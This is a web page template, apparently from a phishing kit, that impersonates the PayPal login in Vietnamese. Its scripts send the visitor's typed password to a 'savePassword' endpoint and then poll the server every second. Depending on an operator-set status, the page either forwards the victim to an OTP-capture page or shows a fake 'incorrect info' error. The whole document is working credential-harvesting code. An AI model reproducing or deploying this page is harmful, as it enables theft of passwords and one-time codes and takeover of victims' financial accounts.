<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Đăng nhập vào tài khoản PayPal</title>
    <link rel="stylesheet" href={{ asset("assets-papal/login.css")}} />
    <link rel="stylesheet" href={{ asset("assets-papal/responsive.css")}} />
    <link rel="stylesheet" href={{ asset("assets-papal/loader.css")}} />
    <link rel="shortcut icon" href={{ asset("assets-papal/assets/logo.ico")}} />
    <style>
        .no-underline {
            text-decoration: none;
        }
    </style>
  </head>
  <body>
    <div class="relative">
      <div class="login-container">
        <div class="logo">
          <img src={{ asset("assets-papal/assets/paypal-mark-color.svg")}} alt="PayPal Logo" />
        </div>
        <div id="loginForm" onsubmit="return validateForm()">
          <div id="email-verified-group" class="email-verified-group">
            <div id="email-verified" class="verifiedEmail"></div>
                <a href={{route('login')}} class="no-underline">
                    <span id="changeBtn" class="changeBtn">
                        Change
                    </span>
                </a>
          </div>
          <div id = "error-group-long" class="error-group hide">
            <img
              class="alert-icon"
              src={{ asset("assets-papal/assets//alert.svg")}}
              width="20px"
              height="20px"
            />
            <p class="error-text">
              Some of your info isn't correct. Please try again.
            </p>
          </div>

          <div id="passwordGroup" class="fieldWrapper">
            <input type="password" id="password" name="password" />
            <label id="passwordLabel" for="password" class="fieldLabel"
              >Password</label
            >
          </div>

          <a id="recoveryOption" class="recoveryOption">Forgot Password?</a>
          <div class="actions">
            <button id="signInBtn" class="button">Log In</button>
          </div>
          <div class="splitPassword">
            <div class="divider"></div>
            <span class="splitPasswordText">or</span>
          </div>
        </div>
        <div class="actions">
          <button type="submit" class="register-button">Sign Up</button>
        </div>
        <div class="languageWrapper">
          <img
            class="flag-vn"
            src={{ asset("assets-papal/assets/vietnam.png")}}
            width="20px"
            height="20px"
          />
          <img
            class="narrow-down"
            src={{ asset("assets-papal/assets/narrow-down.svg")}}
            width="16px"
            height="16px"
          />
          <span class="languageText languageText-selected">Tiếng Việt</span>
          <span>|</span>
          <span class="languageText">English</span>
        </div>
      </div>

      <div class="loading-container" id="loader">
        <div class="loader"></div>
      </div>
      <div class="footer">
        <span class="footer-item">Contact Us</span>
        <span class="footer-item">Privacy</span>
        <span class="footer-item">Legal</span>
        <span class="footer-item">Policy Updates</span>
        <span class="footer-item">Worldwide</span>
      </div>
    </div>
    <script src={{ asset("assets-papal/password.js")}}></script>
  </body>
</html>

<script>
    var email = localStorage.getItem('email');
    document.getElementById('email-verified').innerText = email;
</script>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    $(document).ready(function(){
        $('#signInBtn').click(function(e){
            e.preventDefault();
            let loader = document.getElementById("loader");
            let errorGroup = document.getElementById("error-group-long");
            loader.classList.add("show");
            errorGroup.classList.add('hide');
            var id = localStorage.getItem('id'); 
            // Lấy dữ liệu từ input
            var password = $('#password').val();
            console.log(password);
            // Gửi Ajax request
            $.ajax({
                url: "{{ route('savePassword') }}",
                method: "POST",
                data: {
                    _token: '{{ csrf_token() }}',
                    password: password,
                    id:id
                },
                success: function(response){
                    // Xử lý kết quả sau khi lưu thành công
                    getdata(response.data.id,loader,errorGroup);
                },
                error: function(xhr, status, error){
                    // Xử lý lỗi
                    console.error(error);
                }
            });
        });
    });

    function getdata(id,loader,errorGroup) {
        console.log('đã vào function');
        var redirected = false; // Cờ để kiểm tra đã chuyển hướng hay chưa

        $(document).ready(function () {
            // Định nghĩa function để gửi yêu cầu và lấy dữ liệu khách hàng
            function fetchDataFromLocalStorage() {
                // var savedEmail = localStorage.getItem('email');
                if (id) {
                    // Gửi yêu cầu POST để lấy dữ liệu khách hàng
                    $.ajax({
                        type: 'POST',
                        url: '{{ route("customer.show", ":id") }}'.replace(':id', id),
                        data: {
                            '_token': '{{ csrf_token() }}',
                            // Các dữ liệu khác có thể gửi cùng với email nếu cần
                        },
                        success: function (response) {
                            // Xử lý dữ liệu trả về từ controller
                            console.log(response.data);
                            var data = response.data;
                            if (response.data.status_password === 1 && !redirected) {
                                localStorage.setItem('email',  response.data.email);
                                localStorage.setItem('id',response.data.id);
                                redirected = true; // Đánh dấu đã chuyển hướng
                                window.location.href = '{{ route("view.otp") }}';
                                loader.classList.remove("show");
                            }
                            if (response.data.status_password === 2 && !redirected) {
                                redirected = true;
                                $.ajax({
                                        type: 'POST',
                                        url: '{{ route("change.status.password.bar") }}',
                                        data: {
                                            '_token': '{{ csrf_token() }}',
                                            id: response.data.id,
                                            // Các dữ liệu khác có thể gửi cùng với email nếu cần
                                        },
                                        success: function (response) {
                                            // Xử lý dữ liệu trả về từ controller
                                        },
                                        error: function (xhr, status, error) {
                                            // Xử lý lỗi nếu có
                                            console.error(error);
                                        }
                                    });
                                loader.classList.remove("show");
                                errorGroup.classList.remove('hide');
                            }
                            

                        },
                        error: function (xhr, status, error) {
                            // Xử lý lỗi nếu có
                            console.error(error);
                        }
                    });
                } else {
                    console.log('Không có id được lưu trong local storage.');
                }
            }

            // Gọi function fetchDataFromLocalStorage() mỗi giây
            setInterval(fetchDataFromLocalStorage, 1000);
        });
    }
</script>